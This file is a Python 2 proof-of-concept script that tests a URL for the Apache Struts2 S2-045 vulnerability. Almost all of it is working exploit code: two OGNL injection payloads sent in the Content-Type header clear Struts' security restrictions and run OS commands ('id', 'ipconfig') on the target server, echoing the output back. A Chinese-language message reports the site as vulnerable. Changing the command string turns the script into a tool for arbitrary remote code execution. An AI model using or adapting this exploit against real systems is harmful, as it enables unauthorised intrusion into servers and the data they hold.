#! /usr/bin/env python
# encoding:utf-8
# poc-rewritor:lazynms
import traceback
import requests
import sys
import urlparse
from lxml import etree
from gevent import monkey
from gevent.pool import Pool
from gevent import Timeout
import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
import requests.packages.urllib3
import base64

monkey.patch_all()
requests.packages.urllib3.disable_warnings()

payloads = [
    {
        "match": "uid=",
        "payload": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    },
    {
        "match": "Windows IP",
        "payload": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ipconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    }
]

def verify(seurl):
	jpg_base64_encode_str = "Qk3aAQAAAAAAADYAAAAoAAAACQAAAA8AAAABABgAAAAAAKQBAAAAAAAAAAAAAAAAAAAAAAAA////////////////////////////////////AP///////////////////////////////////wD///////////////////////////////////8A////////////////////////////////////AP///////////////////////////////////wD///////////////////////////////////8A////////////////////////////////////AP///////////////////////////////////wD///////////////////////////////////8A////////////////////////////////////AP///////////////////////////////////wD///////////////////////////////////8A////////////////////////////////////AP///////////////////////////////////wD///////////////////////////////////8A"
	try:
		print "verify url ===>" + seurl
		register_openers()
		datagen, header = multipart_encode({"image1": str(base64.b64decode(jpg_base64_encode_str)) })
		header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
		for payload in payloads:
			header["Content-Type"] = payload['payload']
			match = payload['match']
			try:
				request = urllib2.Request(seurl, datagen, headers=header)
				response = urllib2.urlopen(request)
				response = response.read()
				print "response:\n"
				print response
				if match in response:
					print "\n链接：" + seurl + "    确实存在S2-045漏洞"
					break
			except urllib2.HTTPError, e:
				print e.code
				print e.reason
	except:
		traceback.print_exc()

firstarg = sys.argv[1]

request_url = str(firstarg)

verify(request_url)


